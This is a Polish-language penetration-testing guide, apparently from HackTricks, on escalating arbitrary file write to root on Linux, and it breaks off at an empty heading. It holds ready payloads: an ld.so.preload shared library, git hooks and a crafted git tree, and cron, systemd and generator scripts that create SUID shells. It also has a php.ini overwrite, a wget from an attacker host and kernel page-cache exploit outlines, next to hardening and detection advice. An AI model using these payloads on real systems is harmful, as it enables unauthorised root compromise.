# Zapis dowolnego pliku jako root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` to ogólnosystemowa lista obiektów współdzielonych, które dynamiczny linker ładuje przed innymi obiektami współdzielonymi. Tryb bezpiecznego wykonywania wprowadza dodatkowe ograniczenia dotyczące preładowywania, więc ścieżka do biblioteki, taka jak `/tmp/pe.so`, nie jest uniwersalną techniką dla plików binarnych SUID.\
Jeśli możesz utworzyć ten plik lub go zmodyfikować, proces, który go wczyta, załaduje wymienioną w nim bibliotekę przed pozostałymi obiektami współdzielonymi, umożliwiając wykonanie kodu w kontekście tego procesu.<sup>[[12]](#references)</sup>

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** to wykonywalne skrypty uruchamiane w odpowiedzi na zdarzenia w repozytorium, w tym operacje commit i merge. Jeśli **uprzywilejowany skrypt lub użytkownik** wykonuje te operacje, a atakujący może **zapisywać w folderze `.git`**, hook może posłużyć do **eskalacji uprawnień**.<sup>[[13]](#references)</sup>

Na przykład można **wygenerować skrypt** w repozytorium git w **`.git/hooks`**, aby był uruchamiany za każdym razem, gdy tworzony jest nowy commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal podczas eksportu uprzywilejowanego drzewa Git

Uprzywilejowany synchronizator może pominąć checkout i zamiast tego wyliczyć zawartość repozytorium kontrolowanego przez atakującego za pomocą `git ls-tree`, odczytać każdy blob poleceniem `git cat-file`, połączyć zgłoszoną nazwę ścieżki z katalogiem stagingowym i samodzielnie zapisać plik. Staje się to **arbitrary file write z uprawnieniami synchronizatora**, gdy synchronizator łączy `-c safe.directory=*` (wyłączając ochronę Git przed repozytoriami należącymi do innego użytkownika) z brakiem kontroli, czy ścieżka docelowa pozostaje wewnątrz katalogu. Absolutna nazwa wpisu drzewa sprawia, że Pythonowe `os.path.join(stage, name)` ignoruje `stage`; względna nazwa zawierająca `../` pozwala wyjść poza katalog, gdy system plików rozwiąże ścieżkę. Ponieważ aplikacja materializuje surowe drzewo, zamiast zlecić Git wykonanie checkoutu, odrzucanie ścieżek podczas checkoutu nie chroni miejsca zapisu.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Szukaj takiego schematu kodu w usługach działających jako root, timerach, agentach wdrożeniowych, importerach szablonów oraz zadaniach tworzenia i przywracania kopii zapasowych:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Wpis drzewa jest zakodowany jako `<mode> SP <name> NUL <raw object ID>`. Opcja `git hash-object --literally` celowo dopuszcza dane obiektu, które mogą zostać odrzucone przez standardowe parsowanie lub `git fsck`, więc w tymczasowym klonie można utworzyć drzewo, którego nazwa pliku jest bezwzględną ścieżką docelową. Ten przykład tworzy blob pliku cron, opakowuje spreparowane drzewo w commit i przesuwa do niego gałąź; do wykorzystania podatności nadal wymagane są uprawnienia do aktualizacji repozytorium używanego przez zadanie o podwyższonych uprawnieniach oraz serwer Git akceptujący nieprawidłowy obiekt.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Wzmacnianie zabezpieczeń musi obejmować zarówno przyjmowanie danych z repozytorium, jak i końcową operację na systemie plików:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Zastąp `safe.directory=*` dokładną listą repozytoriów, którym usługa musi ufać, i w miarę możliwości przetwarzaj repozytoria bez uprawnień root.
- Odrzucaj nazwy bezwzględne oraz każdy komponent `.` lub `..` przed materializacją. Po połączeniu ścieżek kanonizuj je i sprawdzaj, czy lokalizacja docelowa pozostaje w obrębie zamierzonego katalogu głównego.
- Unikaj wyścigów symlinków typu sprawdź-i-otwórz: otwieraj ścieżki względem zaufanego deskryptora katalogu, a w systemie Linux używaj `openat2()` z `RESOLVE_BENEATH` oraz `RESOLVE_NO_SYMLINKS` dla ścieżek kontrolowanych przez atakującego.
- Zamiast samodzielnie odtwarzać checkout na podstawie danych wyjściowych plumbing, wykonuj zwykły checkout w odizolowanym katalogu. Jeśli konieczne jest przyjmowanie surowych obiektów, włącz walidację po stronie odbiorczej, np. `receive.fsckObjects=true`; nie obniżaj poziomu ważności usterek `receive.fsck.*` związanych ze ścieżkami, które są niezbędne do odrzucania spreparowanych drzew.

### Wdrażanie uprzywilejowanej konfiguracji

Niektóre usługi zarządzające przechowują zamierzony stan systemu w pliku konfiguracyjnym, a następnie wdrażają go z podwyższonymi uprawnieniami. Na przykład [openmediavault przechowuje konfigurację w `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), a jego [interfejs RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) może stosować zmiany usług. Jeśli konto o niższych uprawnieniach może zapisywać ten plik lub go podmienić, sprawdź, czy może również zażądać autoryzowanego wdrożenia i czy wybrany moduł używa zmienionego pola jako root. Klucze kont SSH, zaplanowane polecenia i instalacja pakietów mają różne wymagania wstępne; sama obecność pliku lub możliwość zapisu do pliku XML nie dowodzi, że którekolwiek z nich jest możliwe. Sprawdź uprawnienia pliku i katalogu nadrzędnego, grupy użytkownika i jego autoryzację RPC, zainstalowaną wersję oraz faktycznego odbiorcę konfiguracji, nie edytując jej ani nie wywołując operacji zastosowania zmian podczas inwentaryzacji.

Definicje akcji Fail2Ban w `/etc/fail2ban/action.d/` to kolejna granica uprzywilejowanej konfiguracji. Użytkownik, który może zapisywać w tym katalogu i przeszukiwać go, może być w stanie podmienić definicję akcji lub dodać nadpisanie, ale same uprawnienia katalogu nie dowodzą możliwości wykonania kodu. Potwierdź, że włączone jail rzeczywiście wybiera daną akcję, że usługa Fail2Ban wykonuje ją z wyższymi uprawnieniami oraz że nastąpi autoryzowane przeładowanie lub ponowne uruchomienie, a następnie pasujące zdarzenie banowania. Niezwiązane uprawnienie sudo do ponownego uruchomienia Fail2Ban ma znaczenie tylko wtedy, gdy dotyczy dokładnie tego wywołania usługi, a zmieniona definicja zostanie wczytana. [Konfiguracja akcji Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) opisuje relację między katalogiem akcji a jail; [przykładowa akcja](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) pokazuje, że `actionban` jest wykonywane po zbanowaniu, z uprawnieniami użytkownika usługi. Sprawdzaj uprawnienia i efektywną konfigurację bez zmieniania akcji ani wywoływania banów podczas inwentaryzacji.

Osobna granica występuje, gdy włączone jail Fail2Ban używa akcji pocztowej wzbogaconej danymi WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) dotyczyło niezaufanego tekstu WHOIS przekazywanego potokiem do GNU mailutils `mail`, którego przetwarzanie sekwencji ucieczki mogło uruchomić polecenie. Użytkownik o niższych uprawnieniach, który może zapisywać pliki, może wpływać na odpowiedź, jeśli może zmienić konfigurację nadpisania serwera **wybranego klienta WHOIS**; [`whois.conf(5)` w Debianie](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) opisuje jeden z takich plików, ale jego ścieżka i użycie zależą od instalacji. Sprawdź efektywną konfigurację jail/akcji, tożsamość usługi, faktycznego klienta WHOIS i ścieżkę jego konfiguracji, implementację mail, możliwość kontrolowania odpowiedzi oraz poprawkę dostawcy lub backport zainstalowanej wersji. Możliwość zapisu do pliku konfiguracji WHOIS, wersja Fail2Ban ani sama akcja pocztowa nie dowodzą istnienia całego łańcucha; podczas pasywnej inwentaryzacji unikaj odpytywania zewnętrznego serwera i wywoływania banów.

### Tworzenie plików przez TFTP i uprzywilejowane hooki pakietów

Dostępna usługa TFTP może przekroczyć granicę kontenera lub użytkownika lokalnego, gdy jej **efektywne** ustawienia tftpd-hpa sprawiają, że działa jako root, udostępnia główny katalog systemu plików jako katalog `--secure` i włączają `--create`. [Podręcznik tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) opisuje opcje tworzenia plików i użytkownika. Może to umożliwić utworzenie nowego pliku w uprzywilejowanym katalogu konfiguracji, w tym w `/etc/apt/apt.conf.d/`; istniejący plik może jednak nadal być odporny na podmianę. [Podręcznik konfiguracji APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) opisuje polecenia `APT::Update::Pre-Invoke`. Polecenie `apt update` uruchomione jako root może stać się odbiorcą o wyższych uprawnieniach **tylko wtedy**, gdy odczyta nowy plik konfiguracyjny. Potwierdź rzeczywiste argumenty i tożsamość działającego demona, dostępność sieciową i filtrowanie, zasady tworzenia plików w katalogu docelowym, efektywny zakres konfiguracji APT oraz późniejsze uprzywilejowane wywołanie. Domyślny plik, katalog docelowy umożliwiający zapis ani zaplanowane polecenie APT nie dowodzą samodzielnie istnienia całej ścieżki. Pasywna analiza powinna odczytywać wyłącznie ograniczoną ilość lokalnej konfiguracji i metadanych, bez przesyłania pliku ani uruchamiania APT.

### Pliki Cron i czasu

Jeśli możesz **zapisywać pliki związane z cron, które są wykonywane przez root**, zwykle możesz uzyskać wykonanie kodu przy następnym uruchomieniu zadania. Interesujące cele to:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab użytkownika root w `/var/spool/cron/` lub `/var/spool/cron/crontabs/`
- Timery `systemd` i uruchamiane przez nie usługi

Szybkie kontrole:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Typowe ścieżki nadużycia:

- **Dodaj nowe zadanie cron z uprawnieniami root** do `/etc/crontab` lub pliku w `/etc/cron.d/`
- **Zastąp skrypt** już uruchamiany przez `run-parts`
- **Umieść backdoor w istniejącym celu timera**, modyfikując uruchamiany przez niego skrypt lub plik binarny

Minimalny przykład payloadu cron:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Jeśli możesz zapisywać tylko w katalogu cron używanym przez run-parts, umieść tam plik wykonywalny:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Uwagi:

- `run-parts` zwykle pomija nazwy plików zawierające kropki, dlatego lepiej używać nazw takich jak `backup` zamiast `backup.sh`.<sup>[[15]](#references)</sup>
- Niektóre systemy używają timerów `systemd` zamiast klasycznego crona, ale pomysł na nadużycie jest taki sam: **zmodyfikuj to, co root uruchomi później**.<sup>[[20]](#references)</sup>

### Pliki Service i Socket

Jeśli możesz zapisywać **pliki jednostek `systemd`** lub pliki, do których się odwołują, możesz uzyskać wykonanie kodu jako root przez ponowne załadowanie i zrestartowanie jednostki albo zaczekanie, aż zadziała ścieżka aktywacji usługi/socketu.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Sprawdź też uprawnienia do zapisu i wyszukiwania w samym katalogu jednostek systemowych, w tym ACL: użytkownik może utworzyć nową jednostkę w `/etc/systemd/system`, nawet jeśli nie ma prawa do odczytu ani wyświetlania zawartości katalogu. Sama obecność tej ścieżki nie uruchamia niczego. Potwierdź, że manager systemu wczyta nową jednostkę, że wywołujący ma skuteczne uprawnienie `systemctl start` lub `restart` dla jej nazwy, umożliwiające działanie z uprawnieniami root (lub inną uprzywilejowaną ścieżkę aktywacji), oraz że usługa działa jako zamierzona tożsamość. Zmiana na dysku istniejącej, wczytanej jednostki może wymagać `daemon-reload`; nowo nazwana jednostka jest wczytywana inaczej. Przed uznaniem reguły restartu z symbolem wieloznacznym za wystarczającą sprawdź dokładne argumenty i wykluczenia sudo. Zobacz [ścieżkę wyszukiwania jednostek systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) oraz [semantykę wczytywania i ponownego ładowania systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Interesujące cele obejmują:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Nadpisania typu drop-in w `/etc/systemd/system/<unit>.d/*.conf`
- Skrypty/binaria usług wskazane przez `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Zapisywalne ścieżki `EnvironmentFile=` wczytywane przez usługę działającą jako root

Szybkie sprawdzenia:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Typowe ścieżki nadużyć:

- **Nadpisanie `ExecStart=`** w należącej do root jednostce usługi, którą możesz modyfikować
- **Dodanie nadpisania drop-in** ze złośliwym `ExecStart=` i wcześniejsze wyczyszczenie starej wartości
- **Wprowadzenie backdoora do skryptu/pliku binarnego** już wskazanego w jednostce
- **Przejęcie usługi aktywowanej przez socket** przez modyfikację odpowiadającego jej pliku `.service`, który uruchamia się po otrzymaniu połączenia przez socket

Przykładowe złośliwe nadpisanie:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Typowy przebieg aktywacji:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Jeśli nie możesz samodzielnie ponownie uruchomić usług, ale możesz edytować unit aktywowany przez socket, być może wystarczy **poczekać na połączenie klienta**, aby uruchomić backdoored service jako root.<sup>[[17]](#references)</sup>

### Katalogi generatorów systemd

**Generatory systemowe** to pliki wykonywalne uruchamiane przez system managera przed wczytaniem plików unitów, zarówno podczas rozruchu, jak i ponownego wczytywania konfiguracji. Dlatego dostęp do zapisu do katalogu generatorów systemowych (lub istniejącego generatora) daje bezpośrednią możliwość wykonania kodu jako root, którą łatwo przeoczyć, jeśli podczas audytu sprawdza się tylko pliki `*.service` i `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Standardowa kolejność wyszukiwania to `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` i `/usr/lib/systemd/system-generators/` (niektóre dystrybucje udostępniają `/lib/systemd/system-generators/` za pośrednictwem połączenia `/usr`). Plik wykonywalny o tej samej nazwie w katalogu znajdującym się wcześniej na liście przesłania późniejszy. Nie myl tych **katalogów wejściowych plików wykonywalnych** z `/run/systemd/generator`, `/run/systemd/generator.early` i `/run/systemd/generator.late`, które zawierają tymczasowe unity wygenerowane przez generatory.<sup>[[35]](#references)</sup>

Szybkie sprawdzenia:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Nowo utworzony generator musi mieć ustawiony bit wykonywania. Jeśli write primitive pozwala kontrolować bajty, ale nie tryb, celem powinien być już wykonywalny generator; jego nadpisanie w miejscu zwykle zachowuje metadane. Jeśli katalog jest zapisywalny, utwórz nowy wpis i ustaw go jako wykonywalny.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Wywołanie `systemctl daemon-reload` dla menedżera **systemowego** wymaga odpowiednich uprawnień, ale ponownie uruchamia wszystkie generatory systemowe; w przeciwnym razie poczekaj na przeładowanie wykonane przez użytkownika uprzywilejowanego, operację pakietową lub ponowne uruchomienie systemu. Katalogi generatorów użytkownika, takie jak `~/.config/systemd/user-generators/`, są uruchamiane przez menedżera użytkownika i **same w sobie nie zapewniają uprawnień root**.<sup>[[35]](#references)</sup>

W celu hardeningu i wykrywania zagrożeń sprawdź każdy składnik ścieżki i ACL, a nie tylko końcowe bity uprawnień; ustal bazowe sumy kontrolne i właścicieli pakietów dla generatorów oraz skonfiguruj alerty dotyczące tworzenia, zmiany nazwy, modyfikacji treści lub uprawnień we wszystkich katalogach wejściowych generatorów systemowych. Monitorowanie zapisu jest ważne, ponieważ generator uruchamiany jednorazowo może usunąć się po wykonaniu, a drzewo wygenerowanych jednostek w `/run/systemd/generator*` jest odbudowywane przy następnym przeładowaniu.<sup>[[35]](#references)[[36]](#references)</sup>

### Nadpisanie restrykcyjnego `php.ini` używanego przez uprzywilejowaną piaskownicę PHP

Niektóre niestandardowe demony weryfikują kod PHP dostarczony przez użytkownika, uruchamiając `php` z **restrykcyjnym `php.ini`** (na przykład `disable_functions=exec,system,...`). Jeśli kod uruchomiony w piaskownicy nadal ma **jakikolwiek mechanizm zapisu** (np. `file_put_contents`) i możesz uzyskać dostęp do **dokładnej ścieżki `php.ini`** używanej przez demona, możesz **nadpisać tę konfigurację**, znieść ograniczenia, a następnie przesłać drugi payload, który zostanie uruchomiony z podwyższonymi uprawnieniami.<sup>[[2]](#references)</sup>

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację piaskownicy.
2. Drugi payload wykonuje kod, gdy niebezpieczne funkcje są już ponownie włączone.

Minimalny przykład (zastąp ścieżkę używaną przez demona):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Jeśli daemon działa jako root (lub weryfikuje ścieżki należące do root), drugie uruchomienie daje kontekst root. To w praktyce **privilege escalation via config overwrite**, gdy sandboxed runtime nadal może zapisywać pliki.

### binfmt_misc

`binfmt_misc` udostępnia rejestracje w `/proc/sys/fs/binfmt_misc`; każda rejestracja przypisuje wzorzec typu pliku do interpretera. Wpływ na uprawnienia zależy od tego, kto może zmieniać rejestrację i który proces później uruchamia pasujący plik, dlatego przed uznaniem tego za ścieżkę privilege escalation sprawdź, czy te warunki są spełnione.<sup>[[21]](#references)</sup>

Plik pomocniczy z `CAP_DAC_OVERRIDE` może stanowić osobną ścieżkę rejestracji, jeśli przyjmuje dane kontrolowane przez wywołującego i zapisuje je do `/proc/sys/fs/binfmt_misc/register`, nawet gdy wywołujący nie może bezpośrednio zapisywać do tego węzła. Podczas enumeracji sprawdź dane wejściowe i sposób zapisu przez plik pomocniczy, nie uruchamiając go. Jeśli zarejestrowana reguła używa flagi `C`, interpreter otrzymuje poświadczenia oparte na dopasowanym pliku binarnym; dopasowany plik SUID należący do root może więc uruchomić kontrolowany przez wywołującego interpreter jako root. Potwierdź montowanie `binfmt_misc` i zasady rejestracji, efektywne capability pliku pomocniczego, dokładną regułę i ścieżkę interpretera, docelowy plik wykonywalny SUID oraz to, czy `no_new_privs` lub montowanie `nosuid` blokuje zmianę uprawnień SUID. Sama flaga capability lub osadzony ciąg ścieżki to jedynie wskazówka do dalszej analizy.<sup>[[21]](#references)</sup> Warunki blokowania SUID opisano w [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html).

### Nadpisywanie handlerów schematów (np. http: lub https:)

Środowiska desktopowe używają skojarzeń MIME i plików desktop entry, aby wybrać aplikację dla schematów URI; atakujący, który może zapisywać do odpowiednich katalogów konfiguracji użytkownika i desktop entry, może przekierować te schematy do kontrolowanego przez siebie launchera. Modyfikując plik `$HOME/.config/mimeapps.list`, aby przypisać obsługę URL-i HTTP i HTTPS do złośliwego pliku (na przykład `x-scheme-handler/http=evil.desktop` i `x-scheme-handler/https=evil.desktop`), można sprawić, że kliknięcie przez użytkownika uruchomi ten desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Uruchamianie przez roota skryptów/binarek zapisywalnych przez użytkownika

Jeśli uprzywilejowany proces uruchamia coś w rodzaju `/bin/sh /home/username/.../script` (lub dowolny plik binarny z katalogu należącego do nieuprzywilejowanego użytkownika), możesz przejąć nad tym kontrolę:<sup>[[1]](#references)</sup>

- **Wykrywanie uruchomienia:** monitoruj procesy za pomocą pspy, aby wykryć, kiedy root uruchamia ścieżki kontrolowane przez użytkownika.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Potwierdź możliwość zapisu:** upewnij się, że zarówno plik docelowy, jak i jego katalog należą do Twojego użytkownika lub są przez niego zapisywalne.
- **Przejmij plik docelowy:** utwórz kopię zapasową oryginalnego pliku binarnego/skryptu i umieść payload, który tworzy powłokę SUID (lub wykonuje inne działanie jako root), a następnie przywróć uprawnienia:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Uruchom uprzywilejowaną akcję** (np. klikając przycisk UI, który uruchamia helpera). Gdy root ponownie uruchomi przejętą ścieżkę, przechwyć shell z podniesionymi uprawnieniami za pomocą `./rootshell -p`.

### Modyfikacja pliku wyłącznie w page cache uprzywilejowanych plików binarnych

Niektóre błędy jądra nie modyfikują pliku **na dysku**. Zamiast tego pozwalają modyfikować wyłącznie kopię w **page cache** pliku, który można odczytać. Jeśli celem będzie plik binarny z ustawionym **setuid** lub w inny sposób uruchamiany przez **root**, podczas następnego uruchomienia może wykonać bajty kontrolowane przez atakującego, znajdujące się w pamięci, i eskalować uprawnienia, mimo że hash pliku na dysku się nie zmieni.<sup>[[3]](#references)[[4]](#references)</sup>

Warto myśleć o tym jak o **prymitywie zapisu do pliku działającym wyłącznie w czasie wykonania**:<sup>[[3]](#references)</sup>

- **Dysk pozostaje czysty**: inode i bajty na dysku nie ulegają zmianie
- **Pamięć jest zmodyfikowana**: procesy odczytujące lub uruchamiające plik z cache otrzymują zawartość zmienioną przez atakującego
- **Efekt jest tymczasowy**: zmiana znika po ponownym uruchomieniu systemu lub usunięciu danych z cache

Ten prymityw znajduje się pomiędzy klasycznym **dowolnym zapisem do pliku** a starszymi błędami **nadużycia page cache**, takimi jak Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW opierał się na wyścigu
- Dirty Pipe miał ograniczenia dotyczące pozycji zapisu
- Prymityw ograniczony do page cache może być bardziej niezawodny, jeśli podatna ścieżka umożliwia bezpośredni zapis do stron cache powiązanych z plikiem

#### Ogólny przebieg privesc

1. Uzyskaj prymityw jądra umożliwiający zapis do **stron page cache powiązanych z plikiem**
2. Wykorzystaj go przeciwko **czytelnemu plikowi binarnemu z uprzywilejowanymi uprawnieniami** lub innemu plikowi uruchamianemu przez root
3. Uruchom plik, **zanim** jego strona zostanie usunięta z cache
4. Uzyskaj wykonanie kodu jako root, podczas gdy plik na dysku nadal wygląda na niezmodyfikowany

Typowe cele o dużej wartości:

- Pliki binarne **setuid-root**
- Helpery uruchamiane przez **usługi root**
- Pliki binarne często uruchamiane z **kontenerów współdzielących jądro/page cache hosta**

#### Przykładowa ścieżka AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) to dobry przykład tej klasy błędów. Podatna ścieżka znajdowała się w linuksowym API kryptograficznym dla przestrzeni użytkownika (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` może przenosić referencje do stron page cache z czytelnego pliku do scatterlisty TX kryptografii
- ścieżka deszyfrowania `algif_aead` działająca in-place ponownie wykorzystywała bufory źródłowe i docelowe
- następnie `authencesn` zapisywał dane do regionu tagu docelowego
- gdy ten region nadal wskazywał na strony pliku w page cache wstawione przez `splice()`, zapis trafiał do **page cache pliku docelowego**

Ciekawą techniką nie jest więc samo CVE, ale pewien schemat:

- **przekaż strony cache powiązane z plikiem do podsystemu jądra**
- spraw, by podsystem **potraktował je jako bufor wyjściowy do zapisu**
- wywołaj niewielkie, kontrolowane nadpisanie w pamięci

Publiczny PoC używał powtarzanych **4-bajtowych zapisów**, by zmodyfikować `/usr/bin/su` w pamięci, a następnie go uruchomić.<sup>[[4]](#references)[[7]](#references)</sup>

#### Przykładowa ścieżka klonowania ESP / XFRM + netfilter TEE

DirtyClone (CVE-2026-43503) pokazuje inny wariant tego samego schematu **zapisu do root ograniczonego do page cache**, ale tym razem celem jest **deszyfrowanie IPsec ESP**, a nie `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Kluczową techniką jest **przemycenie metadanych**:

- `splice()` umieszcza **stronę page cache powiązaną z plikiem, tylko do odczytu** w pakiecie ESP-in-UDP
- pierwotne zabezpieczenie DirtyFrag oznaczało ten skb flagą `SKBFL_SHARED_FRAG`, aby `esp_input()` **skopiował dane przed deszyfrowaniem**
- netfilter `TEE` duplikuje pakiet przez `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- klon zachowuje **referencję do tej samej fizycznej strony page cache**, ale traci `SKBFL_SHARED_FRAG`
- `esp_input()` uznaje wtedy klon za bezpieczny i wykonuje deszyfrowanie **`cbc(aes)` in-place** na stronie powiązanej z plikiem

Wniosek dla osób przeglądających kod jest szerszy niż samo CVE: jeśli zabezpieczenie wykorzystuje **metadane skb/strony** do ustalenia, czy najpierw trzeba skopiować dane, każda ścieżka **klonowania/kopiowania, która zachowuje stronę bazową, ale gubi metadane**, może po cichu ponownie otworzyć możliwość zapisu.

Typowy przebieg exploita:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, aby uzyskać **`CAP_NET_ADMIN` wewnątrz prywatnej przestrzeni nazw sieci**
2. uruchom interfejs loopback i dodaj regułę **netfilter `TEE`** w `mangle/OUTPUT`
3. dodaj transportowe SA XFRM ESP przez `NETLINK_XFRM`
4. zakoduj każde docelowe 4-bajtowe słowo w polu SA `seq_hi` (sztuczka DirtyFrag polegająca na wyborze słowa)
5. wyślij pakiet ESP-in-UDP wstawiony przez splice, tak aby **klon TEE** trafił do `esp_input()` i został odszyfrowany **in-place**
6. powtarzaj, aż kopia `/usr/bin/su` lub innego uprzywilejowanego pliku wykonywalnego w page cache będzie zawierać kod kontrolowany przez atakującego

Pod względem operacyjnym skutek jest taki sam jak w przykładzie `AF_ALG`: plik na dysku pozostaje czysty, ale `execve()` korzysta ze **zmodyfikowanych bajtów page cache** i zapewnia uprawnienia root.<sup>[[8]](#references)[[9]](#references)</sup>

Przydatne sposoby sprawdzenia podatności na ten wariant:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Krótkoterminowe ograniczenie powierzchni ataku również zależy tu od ścieżki: aktualizacja do kernela zawierającego `48f6a5356a33` naprawia ścieżkę klonowania, a zablokowanie autoloadu `xt_TEE` usuwa **krok prania flagi**, natomiast zablokowanie `esp4` / `esp6` usuwa **sink deszyfrujący**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Narażenie i threat hunting

Jeśli podejrzewasz ten rodzaj błędu, nie polegaj wyłącznie na sprawdzaniu integralności plików na dysku. Zweryfikuj również:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Wartości konfiguracji poniżej odróżniają interfejs ładowany jako moduł od interfejsu wbudowanego w kernel; reguły kompilacji crypto mapują `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` można ładować i wyładowywać jako moduł
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs jest wbudowany w kernel
- pliki binarne setuid są dobrym celem, ponieważ poprawka dotycząca wyłącznie page cache może wystarczyć, aby uzyskać uprawnienia root z lokalnego footholda

#### Ograniczanie powierzchni ataku dla ścieżki `algif_aead`

